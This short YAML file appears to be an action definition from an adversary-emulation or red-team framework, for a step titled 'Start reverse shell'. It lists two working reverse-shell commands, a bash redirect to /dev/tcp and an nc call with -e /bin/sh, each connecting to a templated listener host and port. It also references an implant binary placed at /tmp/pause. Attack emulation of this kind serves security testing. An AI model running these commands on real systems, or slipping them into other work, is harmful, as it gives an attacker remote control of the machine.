name: Start reverse shell
description: Establish a reverse shell
tactic: Execution
techniques: [""]
args:
  SRC_BIN: "implant"
  DST_BIN: "/tmp/pause"
# command: "StartListener"
# effects: ["ListenerReady"]
cmdVariants:
  - key: bash
    Command: bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &
  - key: nc
    Command: nc ${LISTENER} ${LISTENER_PORT} -e /bin/sh &
preconditions:
  accessLevel: user-exec
  exists:
    - Listener
